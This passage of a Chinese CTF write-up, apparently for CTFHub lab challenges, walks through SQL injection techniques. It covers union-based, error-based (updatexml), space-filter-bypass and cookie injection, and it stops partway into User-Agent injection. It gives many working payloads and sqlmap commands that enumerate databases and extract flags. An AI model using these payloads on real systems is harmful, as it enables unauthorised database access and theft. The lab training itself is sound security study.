class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为flag</p><p>7.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload1: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> flag</span><br><span class="line">Payload2: ?id=<span class="number">-1</span> union select <span class="number">1</span>,flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入1，发现sql语句数字中我们输入的1被单引号包裹，字符型注入跟数字型注入的区别就在于引号的闭合<br><img src="https://img-blog.csdnimg.cn/20201114185956833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; 返回错误</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1 正常回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2 返回错误</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   返回错误，需加注释符号</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#  正常回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#  返回错误</span><br></pre></td></tr></table></figure><p>可以判断为字符型注入</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 #   回显正常</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #   回显正常</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 #   返回错误</span></span><br></pre></td></tr></table></figure><p>所以字段数为2</p><p>3.联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2#  回显正常</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>#         回显正常</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3#       返回错误</span></span><br></pre></td></tr></table></figure><p>回显点位是2和3</p><p>3.爆数据库名，得到数据库名sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,database()#</span></span><br></pre></td></tr></table></figure><p>4.爆表名，得到两个表名 news,flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>5.爆字段名，字段名flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>6.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(flag) from flag#</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>百度了一下报错注入，报错注入是我们通过反馈出来的错误来获取到我们所需要的信息，发现一共有<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种报错注入</a>，最常用到的三种报错注入方式分别是：<code>updatexml()</code>、<code>floor()</code>、<code>extractvalue()</code>。<br>太菜了，看了下大师傅们的wp，发现这道题就是利用<code>updatexml()</code>函数进行报错注入</p><p><a href="https://www.cnblogs.com/0daybug/p/12334557.html">updatexml()语法：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>XML_document</td><td>XML_document是String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>XPath_string (Xpath格式的字符串) ，xpath报错只显示32位结果</td></tr><tr><td>new_value</td><td>new_value，String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>updatexml的报错原理</strong>：</p><blockquote><p>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数很明显不是，而是我们想要获得的数据，所以会报错，并且在报错的时候会将其内容显示出来，从而获得我们想要的数据。</p></blockquote><p>使用updatexml报错注入固定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=a<span class="string">&#x27;and(updatexml(&quot;anything&quot;,concat(&#x27;</span>~<span class="string">&#x27;,(select语句())),&quot;anything&quot;))</span></span><br></pre></td></tr></table></figure><p><code>concat()</code>函数将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出想要的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114214226330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆库名，查到数据库名为sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205812885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆字段，一个news，一个flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;sqli&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205926889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆字段名，字段名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114210012894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(flag) <span class="keyword">from</span> flag),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205438234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>好像只有一部分flag，这个时候就用到了<code>mid()</code>函数<br><img src="https://img-blog.csdnimg.cn/20201114213929117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用mid函数来进行字符截取,来显示另外一半flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((select group_concat(flag) <span class="keyword">from</span> flag),<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205554257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p><img src="https://img-blog.csdnimg.cn/20210127170719344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/2021012717113182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入<br>2.判断回显点位<br>输入<code>1 order by 2</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127171405960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p>回显点位为1,2<br><img src="https://img-blog.csdnimg.cn/20210127171713726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span></span><br></pre></td></tr></table></figure><p>数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127171630811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有news和nrjduumafr表<br><img src="https://img-blog.csdnimg.cn/2021012717191096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.查字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;nrjduumafr&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为qejxezuixk<br><img src="https://img-blog.csdnimg.cn/20210127172046307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> qejxezuixk,<span class="number">2</span> <span class="keyword">from</span> nrjduumafr</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127172202287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>输入1，回显ctfhub；输入2，回显skill；输入3，无回显。<br><img src="https://img-blog.csdnimg.cn/20210127121828345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过空格过滤的方式： <code>/**/、()、%0a</code>。</p><p>用%0a代替空格输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>有回显<br><img src="https://img-blog.csdnimg.cn/20210127122947660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127124529352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database(),<span class="number">2</span> </span><br></pre></td></tr></table></figure><p> 数据库为sqli<img src="https://img-blog.csdnimg.cn/20210127125025284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span> <span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(table_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> </span><br></pre></td></tr></table></figure><p>sqli中有两个表，分别为 rrkdctjwlf和news<br><img src="https://img-blog.csdnimg.cn/20210127125119950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(column_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;rrkdctjwlf&#x27;</span></span><br></pre></td></tr></table></figure><p>rrkdctjwlf表中，有一个字段wonevkchnv<br><img src="https://img-blog.csdnimg.cn/20210127125346665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看字段的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span> <span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>wonevkchnv,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>rrkdctjwlf</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012712590372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127144717532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burpsuite抓包，可以看到Cookie里面有id参数<br><img src="https://img-blog.csdnimg.cn/20210127144902149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br><code>id=1 and 1=1</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127145409657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>id=1 and 1=2</code>无回显<br><img src="https://img-blog.csdnimg.cn/20210127145335993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入</p><p>2.判断字段数<br>当<code>id=1 order by 2</code> 时回显正常，当<code>id=1 order by 3</code>时无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127145658543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127145752840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表，usrnjffgta和news<br><img src="https://img-blog.csdnimg.cn/20210127145910479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;usrnjffgta&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为wbloxpuwcu<br><img src="https://img-blog.csdnimg.cn/20210127150117665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(wbloxpuwcu) <span class="keyword">from</span> usrnjffgta</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150238553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–Cookie注入</strong></p><blockquote><p>在sqlmap中使用cookie注入，level &gt;=2才行</p></blockquote><p>首先检测是否有cookie注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2  </span></span><br></pre></td></tr></table></figure><p>存在Cookie注入<br><img src="https://img-blog.csdnimg.cn/20210127151950563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用kali里面的sqlmap工具<br>1.查库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 --dbs   </span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150746902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012715085841.png" alt="在这里插入图片描述"><br>3.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151427189.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta -C wbloxpuwcu --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151344509.png" alt="在这里插入图片描述"></p><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127152415405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示输入点在User-Agent，使用bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127152708187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  